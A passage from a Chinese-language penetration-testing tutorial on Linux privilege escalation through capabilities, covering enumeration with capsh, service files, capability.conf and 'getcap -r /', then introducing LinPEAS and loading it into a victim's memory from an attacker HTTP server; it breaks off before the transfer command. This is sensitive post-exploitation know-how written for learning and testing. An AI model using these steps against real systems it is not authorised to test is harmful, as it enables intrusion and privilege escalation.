<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">capsh --decode=0000000000000004</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAi0AAABDCAIAAADf6qImAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAAB76SURBVHhe7Z35WxPJusfn93PPHQ9nQARkCSgwCKKDIIiDCygOOy4guEcdHFCHEQe3cUYHAXEfUDbZDWtYlFVMAoQtgZB0AmTrhH/l3qp0A6GTRoIBiVY9n4en83alqrqoer9d3Z1+v+nu7v4GJZRQQgkllD5HYrFY5BZKKKGEEkoofc40o5EiEAgzgCMQCEMwo5AKRCTqXEIgEMuDOv0QCASAqkAEpAIRiTqXEAjE8qBOPwQCAaAqEAGpQESiziUEArE8qNMPgUAAqApEQCoQkahzCYFAmBfqtEQgviqoCkRAKhCRqHMGgUCYF+q0RCC+KqgKREAqEJGocwaBQJiJ//vmGwQCoQ/SIQRiVaHMQAQCMTE+IJ8UIh1CIFYJYuJ1trPbWuoQiK8cYjqAjYH+LuX0GKlARKLMHAQCYS7mJl5jXVUzm4VAfJW8ISCmQ0VZEdgWDHOsra1JEQKJMnMQCIS5mNMhMBu7Oti93a0IxNdHCwExHUqKC6qrSsBHLy+vdevWIR1CIFYWfR0CE5Lf1z3M/4BAfGX0EhDTAayHKiqK2tvq/f39XVxclqxD6mF5eSFW26vBDXYhEBaKol0r6qcajcDX8m5reA0GdlpUVYleJwqVum1Sh1p1OtTTOjz4QSwalGHDJBIE4iuCmA71tRWsN2Xv2hoCAwPd3d2XqkPat1l9O6M4gZfEfAllFwIxo3gvzckdyyyYlmHUXWsXibYjQJ1jjb/vmVGxtW1MTX2GVmGs/WMpeM6/1DmemjExdRcNioqE75NeKXTbhjoE5EelmMBVYohyRRnvzE7+9VWvimpfCSYERSlJf9UqqHZzsdLlI8zHtEhJscxCTIcWNqupsaanszkgIMAEHZrB3ol/TR/OrFAqDHZZKiJF+ZPxzL/E78bnjTKOLO/PofgTvF2x3B+TBs79jfUIyF2KesHuaI5/FMmuaxhmQT53EYz1g3EwdeFVrn8U93SRGv4wbRhjxnH8Ywdf9M1glcO7QJ/8hok/vU+W3p5PQ/4Sf/Zv9eNw7SQ2I8/Gc/+lzt2nmTLWfmWDpm4fXveHVmmwywCtqOp29BbGhv/+x8aW4RV8NptlVIeAApFfmf+h30ogKk+wC7rVjlPtK4Fk8F6QbewzOdVuLj6tfCWn6sp+H1dHhuv3B355OQz+lci+EnbIWN057/Bs3cUzA8jpMHuZ2t/f3xQdWgYKoZrHxrLujNfNuvLF7asM6UbjRsqFs5ZB6S9JvGO3RPmVsubWqTeFwmPHOCFXJP26JaCKI8t5JMp6JMq8ApeGS9chi+sHWlZFh0xoz6cg1nbsUGd/i7fUw4+L65AJTDRdcGPE5Q2UwetyUn5JTl4V0iEz8SnlS0bzwhy3MRtEEq2k8CTDJvRBj85LIrt57RDtWF6sy+4HAxK9/p9nmTqkrbkBXA+5CAg4IqjXzR99vyOrHoHb6dg4mMOYhlcxdo7J2x3DCQDGhL6YlJHnXVpau3RmvEWcntq/N577YzI/5fHksK58cvERzUutVrY+H4lL5O6MHfynn6z3pxuivzIG9sdzQ04PP+/SgPz44GTW74PRibygGFDOwPkcGX+xdmq7cvuBlswdl3903+022JipMdibGgx2GfgoLB3eHdN3sxnumoNfwA8E5eh06EvtB+N8TIeCLgnu3eAfPMILuygoeg/bQ9c/NO2nbQ9dOUTD5PWZQXYOAZdbp/VbuyjyfPwpWAz9pCWEh9QhP7w5An9mrX7qi79nQzveqyldp87+FyTHTjM0Mft1Xf4XERp2GP7ESv1oM96p0zONsPjweo/zFdii94cW6pCovyglcpuTg529m88e5mP2pBoYMXFlSqjv5s0MBwdnr0O/FgtVwAgzlyc4RFx/kLLfx8PRlhGQlM+dIKa3ZvR1ZvR2D4aLm6urT8jR+018LZnfLoB551q0v6+Ho9P34X+3jxP5zYV2gnUv1pfh6OjuG3YqystmTieUvNrfI/xc7R0cGIGJf3ZIdHMKYvR4pTOT7wrO/+jj5sxw2RSUeLd9Nr/p5RtD9SF7r3XoA44GdGxRQthOH9tdNwZAlyK7ee2wtyV9dwMZ8U8lxL/VgGXq0Mxom7SsEntdMBoFXOfHdEjaKAyP4ew8MZJXJc1O5wUe5d9vgedidHbl+4nEeE5A4uCdQuzJ7YFd0dyY3Okp0NxBeXkWH7j7vaf69h7tP3qWt/OooEFM1hsQ13+5QFpwB/qs3TdkMtBO8XR2+vBvOaKcPEFiIvBf3LMl0FfStVPcKSstFMTHADc6cL0IK6mY5OnOvpU86c20vuAYTnBC/6l70j6u5EQsN/6pAnTxXIcsRYcsvR+M8zEdCojhJd0du365b2c0Z1cqvJVIVy9d++naQ1cO0bCpyhTPdVYep2sn55rar20NUT/6Tl3C1ErBiB3TcjK04/zZvWJtux9cDLXOPnpA6Er2v9XFhzX1Qeqc/1E/DNBIwDpYqB16qPmQjr/4txEdyrbCazK03bHw7lFepFZ3yXr6bcYeF8cdge7O0TnjumGzuA5NNzJ9NgZdY3FVuGSKV1bSwCHWLprxTq4AaoaCez/SkcFkEXoDdMVmvT+zclA0o+QWJ7g6RD0UwQkvbkv12BiVK4SXR8SSrtLmAfFcfhvf5FccoRYX1p/b7JRUqNSVbyZGqk66MqL+5k1KcUlzTpTjrE5IBrJCGIEpDQLxjLy3OMlzy4XKad1XaI5X9PaKN+PgH1wwBqY6n0Q5e54r0+U3uXzjyMvOuTKYtRMz8oaMQ6cqqi96OyZUyZHd3HbQ1dNvUre4X6gd10qqsjL+GSTFaZ7l6hCBmitOiv2oDpHns4ceTIPqwbn8j9Gc4N+lstnzXEN7+4O+nVHc2EdyhUSrGoJ+LSBR2KRXRUBM/+0WvK9w5EgGvD5G1psO65VWkfWKZv0RAe85Hzjun7JhXYv4LyPXfzBVYTovIH4wqw67fpoTcEzQJJRdiefsuTupf1dsCTpk4f0AjAOTeQ/GbmfNk1OrUn90PXQVG8Nm1Dw4VPzjhouHaetdpP1G27NI+3Vo5aMy+dxHbIYXqc51weuO4M/XqZ8F4rUh6tz1eO97MoP8nwWLIWgh1kO7NTLJDN6pKf5Wnf0fvLeP3Iu3aAq/NaJDuXvhdTx5Lv4QbIdoJsnS8PGG/HM/2Fits/U8eLuRv6gOjVUk2m8+V76YNoBzzz3Wkc+GdR8XXGdTsU64OibWwPkv4T8Isd984PeCN3wJoUAE+vnhda31UY+n5vcaQ/n2Xpi7+2ZXEo/A62w21dI6W8VU4YmNLtAfwY96182UbTd32MYVjBDZ8M4rft+fY4NJhNMcr6Lmkod90mtyraasTmIwTtSC4zK5fDE71cve1mYDie3358tUIM/0y0Q797Rm0eij6NgHPaquq342UcXgPA/ZzWvHMawojrEj/b1SquHd+NHnYhv8pyxgNXRoRlA8tAucC18StfPVzdkDwA+GZ02DptDYNZW/z1/0I4kbLhmdryIoVTI8725o61UNTj39cygumRccywUn4wHA/+p8/SL+y9Df4UJpSjwn8OeJPrHy8c9cqENjk9eOcXbflunr0EA+H+pQhhT7QvsBoOoQRYNFiV57YDmzOpT8Cs5tnI+dAXpjeH9IKP1Zp0/PuLT1mtqeRfIbAZsRPdb01sBtWaHmtYv64Ua86R84DeBesfbd9gWLIQCpK8T9oWFtpRXM0NFB7qXVIV1+RR5FhwDwue2kx2/v7nFwjl9Mh9Sc7L3fBd3qIHRFD0zWlfdbYljo/r0HDwRvtbeKfDo0d51tTofwd2m+1hGvwBoCfFSP9BZdvxgb5OXk5BebXjdKXJ031KFHH9EhXDwl6hsb5ZEI+JMKQwuZWTuWFW69/eZ7oi49nQDnyy5Wzt47ggL9If7ent5nWEBXVDTHO51/dL17GpuUN/xdqq/1Ty/B+Zmp5ROlGQLyMxjM1yWXDl5gg6VVy8/z5/XIbka7qjdnv8PBXI4Gnhxc9vNeOR1qIHWI9AVUvzChLLzGA+4POq9obmiaiD2sK8G4HT4ODozhd7DubkUvQY8K0z0XsMC1zTbDuD+S4K8zQOHcmD+x1i5F00M+8O+z/pemnaBHRrHz0N8Nl4yQhQPHejpW5/EX6tDeP+HEUxMPrGOauj/ggYT9PaX8QvuBHk1VJmz8IZ2mqtrH4aXa+JEywWx7dOWrORPHwFA5PFIB7cbrNd5++vYs0n4dYD00Ob8eWpTpZ3Ax9CRifjEE0F/f4G1QdbK/w7mD5N7l6dCJQoXw/gEbX8rEG+Z/kEmGcSXhc4WlRze4n69UzX6RZKr0rKtj7OMeuG5QcXL2WhvVIWLdUAfmv+4jyWRnTrgd41Spbs2xDB0yhcn8BDv3VFI/9NcrrZl+dkcKRxdkhghLj2xwZ1bqzmP0AOshd+p6CB6XyeXTrIfg/YzvfPyDjz7jaXFM8uyg3fx9DmQ3nx17fpyxcZOnp7eXp/fmDVb/2eDum1g8seDW3afpkKpnIh44neQxsCQHH+UNgr3RnJ0nR19UY5kp0DcRfgEXyC4ncHYmD6bdEVx7MFHSoBDp8tPZFd0Tx+KBL+s/nyXKfTJ+9crgdZYaXu/my0v/5gM3GnhBWFg9NTD7CC+N/1XlX+ZCP54+/uj52PnTcDs4VTwgoW0nLE0sv38GikHEFcG1m8OpLxXKiclroJEnhY1cWXoyvC7XOCa7epgbnScfrRqNPDP0W9bY7xkDIWCdETfwoAPeP/8y+0FXhVEmakb3g8M/MnDxnjCFCcsJvSkF44xoD2j/pVxRxi/Qvi9TKsJo611Eh4y2Z7H2A69dYXB/iA6wGNoG1zptC3+USuhKthVexdTU+atz/qV+8hN8nlszqB3IJe8PZVvj7CwNt1QL5hudDqk6n5xJuMvqxSrheujdvX1OnqcX1SGprCbZ0zE4g/VBrhZLea+L63px0B7saZztZiYL+FlMznuc6G4VlgMmPMgPdGW9U/itdpFYO9X5JNp508kiGbQLuvLvl3XzVWqpVtaxejqk7s+PdvD95Q28NzPdkRexce7+DffPIOed56v5QFrEks5CVi+pMbLqZM+NwRlvPshVYin3dXFtr65t4+wUT+eDf3DA2m6yIy/K2fvnKlim6eXTIBnJC7VziCoSYVpJ7bWdDnPPfSG7We3zqNnnvbeYez2k7X3KD4rm7L6GAacDLWLFq8z+PXG80DOD6Q9GY2Jm/YJYWXxrIBS41Nmf2oSkiDqB96SzS7Xkc2Jx3MDDvJhfhS9a1GCek8+JEesG3ZUfoiV0/kvWKbl8gRccxzvIHL71WlZwlx+VgQlge2jaSZT2Tpx6gbc7lhucOHD2gUyAad+/GAQyA5xg3F9jF5KGXrAnkmJ5l6rVI03ia5f798VzA+N5UWmCx82wkV9uP5B2I2Ca3lLhmbO8YFBCYv/Zv7EPY9BOtCciQ5h6nrcrnhebMdFKrP9o6l1Mh4y2Z9H2yxuI5+XaPvq8HFgMPQGLocgFiyEAoSsvwjTV3uqHVuqCMM0wD9pxtubV/5LPyxEQekO7HhILaq8fD3Z3trNa952d976TT7sFi+vQjEb44cXZA1s32q7fsGnbnrMPG6CuaMZ7cuJ3bHL29PIKiEx7nn0i6OBNHnwGAeiKrVf4kUM+jvZ2Dlsj0htBJ4D86qF3OacObHW0t3fa7LElJCGzSbjs63KmgQ++TNu31W93aFRUwvVzwRtInQBLFk7NtQh/N7uNzm5bg2NvvuHN+inhh+dnD/hsBMuVTb57zuY2yIgHq6TsRycCPZwcXFzcQ85k9xIXG5dTPg1KTuWVfT4MR4aLR9ilgiHYmci+AvZZ8JaLPmbUIa2EM1WYNRgKr8Dws9rhw7i0YHhf82RDo4K44awSTN08DXw6L5NNZ6d/RPizoZUOKHk8XIlpWrP6A6M5u86OtepcrQl8Cf3wJSKZ+RCmzgGLoUaDXWbGyHt9aHWIBr2pq4e+riAQlseydEjRJNyvWx/svSB48RYHZy6UDAvA1C+vcANi+i4+xapZsrJXwqNHOAFHhl7xaOyzZ/drFIlmtFc5JjKwf5QvrB++JMQzEyztEu8kfQKLv18O6RDiq2VZOoSPThfmY/Vd6qXeBOZI76QPHDwKH9badazvcLrwRRu8z0Fnp3z9iwH1A2IWs+qQuOfZ5ZymQd29IgTC8liWDiEQiE/DrDqEQFg2SIcQiM8AMfEQCMQcSIcQiFWFMgMRCMRa0yFxd27yr8WcRR/DMxfYeGnK8fv1aqrdXKx0+QjzoZLAn+msFhMifltrXUV5UUlxAfhbX1fR0swCFiotelB2fRT97yIQa5vGhuo1pUOi8kS7oNvtq+IUJIP3g2zjnsmpdnPxaeWrOFVX9/u4OTLcvj+Q+nKY/H0SspvbDhmrY3qH5/SuytkPRD41NtDfDSZedVVJRUUR601ZU2MN+IhAfLW0tdQjHVoJPqV8yeijMMftzIYJiRYrPOlqE5rdo/OSyG5eO0Q7nhfL2P1gdSMLK+XjghFub09r+9uGd20NPV3NYFtH2zzdrfOQe5eM/ncRCEuA2/tu6Tok6i9Oidzu5GBv77Z1D/MJexIHRkxclRK6bfNmVwcHF69D6cVC8uFjoCsOEb8/SAn18XCyZexMyueRr+TSCF5nxmz3cHVxc3P12XP0Ppuv+/Em1KGA83euxfj7ejo6eYX/3TH76hozoRWz7sX5Mpwc3beFnYr2spnTCRWvNjPCz83eYSMj8PifHfNB7Ywer3Rm6l3BhR99NjkzGJuCjt9tn81vevnGUH/I3mcdms3RgI4tTggL9LENvjEAuhTZzWuHvS3p+zOQcfiphPi3riIqxYRYNDg8+GFwoGeI/x5sUOHrQdn1UfS/i0BYCD/88MOSdGi6ienjGHStlqvSSKb6ykoaOcTaRSPq5AqhZih49yOddLEooB3ois36AGblkGhGxS1OdHWIfiiCE17cluaxMToXhvPSiCXdpc1EfDZdfpttya+4Qq1GWM/c7JRM/vrPTIxUnXJlRP/Nm5LiWHNOtOOsTkgGHoQwglIahOIZRW9xsueWi5XTuq/QHK/o7VVvRvgf3EnpzDR8r5cns0yX3+TyjaMoO+fGYNZNzCgaMn46VVFz0dspoUqB7Oa2g66Wv0n1dr9QN67FqrKu/zNIitMqgavE05MCGTZsfiQIhOUBRMjFxeWjOjRWcdx+M7N8MW0A5557rSOfE+8TW3CdTVV7wtUpsQbOfwk/O8Te/cDvL9/wMUKBCPTzw+ta66MfT83vNYbq7b0DoPGuJJ6B15vZVEvbbBXThSccXaA/gh/1rpup2m7628a9JN/ojHdd8fM6x1aCbZrjVdZc8rRPKiPXasqaJIbriVpwXCaXL2anedlvsNlAYvv9hTL4rmX5y0R797QW0ejj6NjsHlX3Vb/1UcXTyG5uuwbDiuMY/unvVVJN340ft15sg/+UVUWjxoAamR8lAmF5rNOlj+mQmpO977ug2x0G928wWXfeb8fDQkP3HjwYvNXBKvLZ0Nx1tjkdwtvTfG0iXhFvQcZHeouvX4wL8nJ28otLrxMQV+cNdejRR3RII56a6BsT8EiE/EmloYXMrB3PCrfZfrOXqEtPJ8D5MsPK2WdHUJA/JMDb0+cMC+gK3fHK84/auqc1k/KGt6f62vz0ctL08onSDAH5XRnMspJL4RfYYGnV+vP8eT2ym9Gu7s0JdTj4kKOBJweX/Xw+gw4tikwPyq6PofuRIAJhWZAKRCTqmJ6HPj6Km2Pskx64blBzcvZZG9UhYt1QB+Y/8S2Cqc6cQ3aM06W6NccydMgUpvIT7N1TSf3QX6+0Zu6wO1KkCzS3AJrjBeshD+p6CB6XyeXTrIfg/YzvfAKCjz7naTWY5PlBu/n7HMhuPrv0+XHXjZu+9/Te4untvsHKaoP7tsRi8Yq/bu5zYjDzEYi1A6lARKKOXT1o46Ns2MysBX4Wk/c9TvSwCssFEx7kB7qy3unQrfYJsXa680mM86ZTRTJoF3QV3C/r4atwqXayY/V0CO/Pj3HwTX0D783IO/IiN87dv+H+FeQceL56EEiLWNJVyPpAaozx49WMsy95Oof/wQFru6mOvGhn75QqWKbp5dMgGXkUarcxqmgC02K11wId5p77Qnaz2udRN5/39l5r66EVwGDmIxBrB1KBiEQduwugiY+SG79js7PnFq+AqLTnOSeCwm/y4DMIQFdsvQ4dOQRDoThsjUxvJGIc4EPvck8d8HW0d3Da7LklJDGzaWzZ1+VMAx96mbZ/q9+PoVHRCdeZwRtInQBLFk5NRoT/JruNLm5bd8feZPFm/ZTR45XOyNiPTgZ6ODu4MNxDzmb3Ehcbl1M+DSpO5dV9Pq6ODIZH2C8FQ3q/g0F2c9pnwVsv+iAdQiA+K6QCEQmMV8p7FxAIhEWwQHUMMZj5CMTagVQgIoHxShncCATCIpgQ8eVT9KEaDWY+ArF2IBWISGC8EmO6s4NNfW+VabAK/7iU+azcwI5AIMwMMWfBxkB/t1JOcwPSYOYjEGsHUoGIBMbr3JhurK+ivAgIgUCsQYg5W1FeBLYFI1yVgnx3yQIMZj4CsXYgFYhIYLzO6RAY012dbOrbqxAIxBqDmLMlxQXVVSXgo1g0iKv0fySOdAix1iEViEhgvOrrEBjT/P5u6gusEAjEWoKYs2A9VFFR1P62AVimJwUa9dJ+DmXgERCI1YdUICKBcUnRITCmwekV9R1WiLXGxKCEYvn8DPW/TEm+Wymm2tcaa7mdgy1ZJ6/kv8Oo9gUQc7a+roL1puxdW8PgQA8wGlkSGcXAIyAQqw+pQEQC49JQh8CYVikmcHlvxdWw7Z5u7p4+4an5fLnBi60o0OVHdvPaIaMs5rZD2T2qectaQNR/L9gp/ukk1b7WWMvtFL4+7hJ8662Sal8AMWdbmllNjTU9Xc1D/PdIhxCWBalARALj0qgOgbm6SBwXY3yuuDJfmx3yWeLoLAG99xutadZyO/V/300LzZxFOoSwGEgFIhIYl8bHtOI9TRwXSV9O5MGrFWJYFr/x1/1x2Z1wzsD3eq1k/BhkJ+zQlZgaR8c8caTooInDRFc+gCbOk3HEbzODPR2tQ+6xm+5E7PB0tLXe/4R4VYfxOE+09dLGi6KBJm6WqfXSt994P0Ad+mhcLqRDCEuHVCAigXFpfExPldLFcdGMlV4KcNp56WnxlQDGjjM1Qt1ZueIzxZX52uygq02Mo2OmOFJ00MVhoiuftj30SDg3/Bg+2w5cKhHK8o+5xJXCOA60cZ5o6qVtJw10cbNMrRd+xVj7aeNdLSUuF9IhhKVDKhCRwLg0PqYn82niuEA0wheJrv/+1jmygAziQB/3BdnNa6eNo0PzPm+zxZGigS4Okz4Lyl9Ce6gAP779v+6nG6ZAUb1NxSy41KCN86SHfr1LaecCaOJmmVovxFj7aftBv/+J9y4aicuFdAhh6ZAKRCQwLo2PabAeMhrHBY5jfuPVANcdkYcDnHemlcMLdMAIzt9XNH4MshN2U+PomDGOlDFo4zDRlU/bnkUAfvwHh2P5Cn0j6B/jcZ6M10vfTnqMxs0ysV5dUcbaT9sPhjpk5P2/SIcQlg6pQEQC49L4mIb3h4zFcdFI+h6EuAUwWWMSraj88k6X/Vm6uQTvZ6xk/BhkJ+y0cXTo1kMrEEdKH7o4TLTl07RnMXR+PPHlgqUDXZwnunrp2rkU9ONmmVovxFj7afth5XWIDgNPgUCsHKQCEQmMP5oxLaKL46IVd/MnyMtxGrBNBhP7XHFlvjb7PEuMo2OmOFI00MVhoi2fLs7TIhj14zRxnujqpY0XRQdd3CwT69V9xVj76foB6RDiq4BUICKB8Uc7pj8Wx4XKSsePQXbCPsuS4+iYI44UPTRxmOjKB9DEeTIO8byZ1Tpb5y2UCKrG4zzR1ksbL8ootHGzTK2Xvv3G+wHpEOKrgFQgIoHxtyJjGmGp6PtBxBoF6RDC0iEViEhg/CEdQuhhXIeU5QkuNt/ZLMAuoVh3ScocrHT5dHyuej8RpEMIS4dUICKB8Yd0CKGHuOf55Rz24Oy9DcRaBOkQwtIhFYhIYPwhHUIgLAukQwhLh1QgIoHxh3QIgbAskA4hLB1SgYgExh8xphEIhGWxTB0y8AgklGwfhfJ1BMIUSAUiEhhPlMGNQCAsAqRDCMuFVCAiEUNqQsQHY7qivKikuAD8ra+raGlmAQuk7h/WL6kVV7LZbN3HL4E37OzbNVcyWP/UzBvrS+pvXatIPlMSn1Ry+PRr5vW6wmpyF/txNTDGHieJT6urm/2WZWOsH2hovn8JHvu5+80tdW0tFXXM5JLYpPI/StvqciriQZ+k1rGoXzEdE9rzSTT91XInvPl2QlsD2M5suRHefONoa6NBNgD7Seujoy2PfmtbyuB/k/trUnTEofDwQ4ciouKZmXmsZoM8ZqWxoRrpEMJCIRVIPzk6OgYFBYWHh8fExMTGxkZFRR06BOYTSiihtKbTgQMH9u7d6+/v7+7uvm7dOnI+o4SSpaR79+6RW7pkZ2fn5+cHxvRBXdq/fz/YRgkllNZ4CgkJQTqEkiUmJpP5/5sVvYOoq94sAAAAAElFTkSuQmCC" width="557" height="67" class="img_ev3q"></p>
<p>太棒了！如果这个进程是 cat、vim、nano 等，那么它可以用来读取敏感文件。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="212服务-capabilities"><strong><div id="id2.1.2">2.1.2、服务 Capabilities</div></strong><a href="#212服务-capabilities" class="hash-link" aria-label="212服务-capabilities的直接链接" title="212服务-capabilities的直接链接">​</a></h6>
<p>我们可以检查给定服务的 capabilities，但首先我们需要找到系统上有哪些服务。为此，我们可以检查以下位置：</p>
<ul>
<li>/usr/lib/systemd/system/*</li>
<li>/etc/systemd/system/*</li>
<li>/run/systemd/system/*</li>
<li>/lib/systemd/system/*</li>
</ul>
<p>找到感兴趣的服务后，使用<strong>cat</strong>命令查看服务文件并查找<strong>AmbientCapabilities</strong>。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /lib/systemd/system/mysql.service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307635-1963647427-675d5d5b8befff0022addfbad71a1a66.png" width="632" height="786" class="img_ev3q"></p>
<p>默认情况下，以 root 身份运行的服务将被分配所有 capabilities。然而，即使是非 root 级服务也可能过于 &quot;能干&quot;，允许潜在的横向权限升级，这实际上就离 root 更近了一步。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="213用户-capabilities"><strong><div id="id2.1.3">2.1.3、用户 Capabilities</div></strong><a href="#213用户-capabilities" class="hash-link" aria-label="213用户-capabilities的直接链接" title="213用户-capabilities的直接链接">​</a></h6>
<p>为用户分配的 capabilities，这意味着如果没有特别指定，用户执行的每个进程都将默认拥有为用户设置的 capabilities。</p>
<p>当 capabilities 已分配给单个用户时，可以在 /etc/security/capability.conf 文件中找到它们。如：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/security/capability.conf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304571-2081517815-da0d03595183bd607eb7b4b1de7c5a73.png" width="573" height="243" class="img_ev3q"></p>
<p>如果为用户提供了正确的 capabilities，那么他们的进程就会被劫持，从而提升权限。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="214二进制-capabilities"><strong><div id="id2.1.4">2.1.4、二进制 Capabilities</div></strong><a href="#214二进制-capabilities" class="hash-link" aria-label="214二进制-capabilities的直接链接" title="214二进制-capabilities的直接链接">​</a></h6>
<p>好了，开始讲有趣的内容吧！二进制功能将成为本文的重点，因为我们将回顾在各种二进制命令上设置 6 种不同的 capabilities，这些 capabilities 将允许命令以特权读取访问任何事情，以及以 root 身份执行完整命令等一切操作。</p>
<p>要查找整个文件系统中所有设置了 capabilities 的二进制文件，我们可以使用以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">getcap -r / 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304700-1491376957-9006f049557a2629af2cf3e3d047ae52.png" width="874" height="223" class="img_ev3q"></p>
<p>在这里，我们可以看到五个不同的二进制命令，它们设置了一大堆不同的 capabilities；最重要的是，它们都可以通过某种方式被利用，要么导致立即提升权限，要么让我们更接近提升权限。另外，请注意二进制文件的位置。通常会将原始二进制文件的副本移动到非标准位置，然后向其中添加功能，这样原始二进制文件就不会被篡改。</p>
<p>在进入精彩内容并查看上述每项突出功能的示例之前，让我们快速了解一下如何从 LinPEAS 的输出中找到这些功能。</p>
<p>注：<strong>关于用户、命令、进程之间的 Capabilities 关系。</strong></p>
<p>root 进程的默认 ep 集功能是全部，而普通用户进程的默认 ep 集是空，当命令本身被赋予指定 Capabilities 之后，以不同用户身份执行，ep 集则会在原有的用户功能集基础上再进行命令功能集的功能集合并。 这一点在 root shell 环境中看不出来什么，但是在普通用户 shell 环境中差异很明显。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22枚举-capabilities--linpeas-方法"><strong><div id="id2.2">2.2、枚举 Capabilities – LinPEAS 方法</div></strong><a href="#22枚举-capabilities--linpeas-方法" class="hash-link" aria-label="22枚举-capabilities--linpeas-方法的直接链接" title="22枚举-capabilities--linpeas-方法的直接链接">​</a></h4>
<p>LinPEAS 是一款终极的后渗透枚举工具，因为它提供了大量信息。在受害者上运行该工具后，我们将看到手动枚举发现的所有相同内容，甚至更多。然而，在使用工具之前展示手动步骤非常重要，这样我们才能了解工具的输出以及要查找的内容。</p>
<blockquote>
<p>如果您没有 LinPEAS 的副本，您可以 <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">在这里</a>获取一份。</p>
</blockquote>
<p>通常，当我们运行 LinPEAS 时，我们会不带参数运行“所有检查”，然后从上到下逐行梳理所有输出。</p>
<blockquote>
<p>运行完整扫描时的一个好技巧是将 PEAS 的输出重定向到文件，以便使用 <strong>grep</strong>快速解析常见漏洞和关键字。</p>
</blockquote>
<p>获得 LinPEAS 副本后，我们通常会将副本传输给受害者。但是，在本例中，我们将把它下载到内存中，这样文件就不会接触磁盘。</p>
<p>首先，我们需要从linpeas.sh所在的目录在攻击者的机器上设置一个 HTTP 服务器。</p>
